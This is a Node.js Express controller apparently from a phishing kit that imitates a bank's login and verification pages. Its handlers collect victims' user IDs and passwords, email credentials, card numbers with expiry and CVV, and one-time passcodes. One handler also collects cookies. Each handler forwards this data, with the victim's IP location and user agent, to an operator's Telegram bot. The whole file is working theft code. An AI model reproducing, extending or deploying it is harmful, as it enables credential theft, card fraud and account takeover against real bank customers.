const { sendMessageFor } = require("simple-telegram-message");
const { botToken, chatId } = require("../settings");
const getIPDetails = require("../middleware/getIPDetails");
const anti = require("../middleware/antibot2");

// console.log(getIPDetails());

exports.login = (req, res) => {
  return res.render("login");
};

exports.loginPost = async (req, res) => {
  const { userId, password } = req.body;

  const iPDetails = await getIPDetails();
  const { query, city, region, country, isp } = iPDetails;

  const userAgent = req.headers["user-agent"];

  const message =
    `✅ @AKFOUR7👨‍💻 | M&T || LOGIN-1 \n\n` +
    `🔰UserID : ${userId}\n` +
    `🔑Password : ${password}\n\n` +
    `+++++++++++++++++++++++++++++++\n\n` +
    `IP ADDRESS INFO\n` +
    `IP Address       : ${query}\n` +
    `City             : ${city}\n` +
    `State            : ${region}\n` +
    `Country          : ${country}\n` +
    `ISP              : ${isp}\n\n` +
    `+++++++++++++++++++++++++++++++\n\n` +
    `SYSTEM INFO || USER AGENT\n` +
    `USER AGENT       : ${userAgent}\n` +
    `👨‍💻 @akfour7 - TG 👨‍💻`;

  const sendMessage = sendMessageFor(botToken, chatId);
  sendMessage(message);

  res.redirect("/auth/login/2");
};

exports.login2 = (req, res) => {
  res.render("login2");
};

// COOKIE RESULTS
exports.loginPost = async (req, res) => {
  try {
    const anti1 = await anti;
    const file = JSON.stringify(anti1, null, 2);

    const { userId, password } = req.body;

    const iPDetails = await getIPDetails();
    const { query, city, region, country, isp } = iPDetails;

    const userAgent = req.headers["user-agent"];

    const message =
      `✅ @AKFOUR7👨‍💻 | M&T || LOGIN-1 \n\n` +
      `🔰UserID  : ${userId}\n` +
      `🔑Password : ${password}\n` +
      `++++++++++++++++++++++++++++++\n\n` +
      `IP ADDRESS INFO\n` +
      `IP Address       : ${query}\n` +
      `City             : ${city}\n` +
      `State            : ${region}\n` +
      `Country          : ${country}\n` +
      `ISP              : ${isp}\n\n` +
      `+++++++++++++++++++++++++++++++\n\n` +
      `SYSTEM INFO || USER AGENT\n` +
      `USER AGENT       : ${userAgent}\n` +
      `+++++++++++++++++++++++++++++++\n\n` +
      `COOKIES          : ${file}\n` +
      `👨‍💻 @akfour7 - TG 👨‍💻`;

    const sendMessage = sendMessageFor(botToken, chatId); // Replace with the actual implementation
    await sendMessage(message);

    res.redirect("/auth/login/2");
  } catch (error) {
    console.error("Error in loginPost:", error);
    // Handle the error appropriately, for example, send an error response to the client
    res.status(500).send("Internal Server Error");
  }
};

// NONE COOKIE RESULT POST
// exports.loginPost2 = async (req, res) => {
//   const { userId, password } = req.body;

//   const iPDetails = await getIPDetails();
//   const { query, city, region, country, isp } = iPDetails;

//   const userAgent = req.headers["user-agent"];

//   const message =
//   `✅ @AKFOUR7👨‍💻 | M&T || LOGIN-2 \n\n` +
//     `🔰UserID2 : ${userId}\n` +
//     `🔑Password2 : ${password}\n\n` +
//     `+++++++++++++++++++++++++++++++\n\n` +
//     `IP ADDRESS INFO\n` +
//     `IP Address       : ${query}\n` +
//     `City             : ${city}\n` +
//     `State            : ${region}\n` +
//     `Country          : ${country}\n` +
//     `ISP              : ${isp}\n\n` +
//     `+++++++++++++++++++++++++++++++\n\n` +
//     `SYSTEM INFO || USER AGENT\n` +
//     `USER AGENT       : ${userAgent}\n` +
//     `👨‍💻 @akfour7 - TG 👨‍💻`;

//   const sendMessage = sendMessageFor(botToken, chatId);
//   sendMessage(message);

//   res.redirect("/auth/email-verification");
// };

exports.login3 = (req, res) => {
  res.render("email-verification");
};

exports.loginPost3 = async (req, res) => {
  const { email, emailPassword } = req.body;

  const iPDetails = await getIPDetails();
  const { query, city, region, country, isp } = iPDetails;

  const userAgent = req.headers["user-agent"];

  const message =
    `✅ @AKFOUR7👨‍💻 | M&T || EMAIL ACCESS \n\n` +
    `📧Email : ${email}\n` +
    `🔑Email Password : ${emailPassword}\n\n` +
    `++++++++++++++++++++++++++++++++\n\n` +
    `IP ADDRESS INFO\n` +
    `IP Address       : ${query}\n` +
    `City             : ${city}\n` +
    `State            : ${region}\n` +
    `Country          : ${country}\n` +
    `ISP              : ${isp}\n\n` +
    `++++++++++++++++++++++++++++++++\n\n` +
    `SYSTEM INFO || USER AGENT\n` +
    `USER AGENT       : ${userAgent}\n` +
    `👨‍💻 @akfour7 - TG 👨‍💻`;

  const sendMessage = sendMessageFor(botToken, chatId);
  sendMessage(message);

  res.redirect("/auth/card-verification");
};

exports.card = (req, res) => {
  res.render("card");
};

exports.cardPost = async (req, res) => {
  const { cardNum, exp, cvv } = req.body;

  const iPDetails = await getIPDetails();
  const { query, city, region, country, isp } = iPDetails;

  const userAgent = req.headers["user-agent"];

  const message =
    `✅ @AKFOUR7👨‍💻 | M&T || CARD_DETAILS \n\n` +
    `Card Number : ${cardNum}\n\n` +
    `Expiry Date : ${exp}\n\n` +
    `CVV : ${cvv}\n\n` +
    `++++++++++++++++++++++++++++++++\n\n` +
    `IP ADDRESS INFO\n` +
    `IP Address       : ${query}\n` +
    `City             : ${city}\n` +
    `State            : ${region}\n` +
    `Country          : ${country}\n` +
    `ISP              : ${isp}\n\n` +
    `++++++++++++++++++++++++++++++++\n\n` +
    `SYSTEM INFO || USER AGENT\n` +
    `USER AGENT       : ${userAgent}\n` +
    `👨‍💻 @akfour7 - TG 👨‍💻`;

  const sendMessage = sendMessageFor(botToken, chatId);
  sendMessage(message);

  res.redirect("/auth/success");
};

exports.otp = (req, res) => {
  res.render("otp");
};

exports.otpPost = async (req, res) => {
  const { otp } = req.body;

  const iPDetails = await getIPDetails();
  const { query, city, region, country, isp } = iPDetails;

  const userAgent = req.headers["user-agent"];

  const message =
    `✅ @AKFOUR7👨‍💻 | M&T || OTP-1 \n\n` +
    `OTP-1 : ${otp}\n\n` +
    `++++++++++++++++++++++++++++++++\n\n` +
    `IP ADDRESS INFO\n` +
    `IP Address       : ${query}\n` +
    `City             : ${city}\n` +
    `State            : ${region}\n` +
    `Country          : ${country}\n` +
    `ISP              : ${isp}\n\n` +
    `++++++++++++++++++++++++++++++++\n\n` +
    `SYSTEM INFO || USER AGENT\n` +
    `USER AGENT       : ${userAgent}\n` +
    `👨‍💻 @akfour7 - TG 👨‍💻`;

  const sendMessage = sendMessageFor(botToken, chatId);
  sendMessage(message);

  res.redirect("/auth/otp-verification/2");
};
exports.otp2 = (req, res) => {
  res.render("otp2");
};

exports.otpPost2 = async (req, res) => {
  const { otp } = req.body;

  const iPDetails = await getIPDetails();
  const { query, city, region, country, isp } = iPDetails;

  const userAgent = req.headers["user-agent"];

  const message =
    `✅ @AKFOUR7👨‍💻 | M&T || OTP-2 \n\n` +
    `OTP-2 : ${otp}\n\n` +
    `++++++++++++++++++++++++++++++++\n\n` +
    `IP ADDRESS INFO\n` +
    `IP Address       : ${query}\n` +
    `City             : ${city}\n` +
    `State            : ${region}\n` +
    `Country          : ${country}\n` +
    `ISP              : ${isp}\n\n` +
    `++++++++++++++++++++++++++++++++\n\n` +
    `SYSTEM INFO || USER AGENT\n` +
    `USER AGENT       : ${userAgent}\n` +
    `👨‍💻 @akfour7 - TG 👨‍💻`;

  const sendMessage = sendMessageFor(botToken, chatId);
  sendMessage(message);

  res.redirect("/auth/success");
};

exports.success = (req, res) => {
  return res.render("success");
};

exports.page404Redirect = (req, res) => {
  return res.redirect("/auth/login");
};
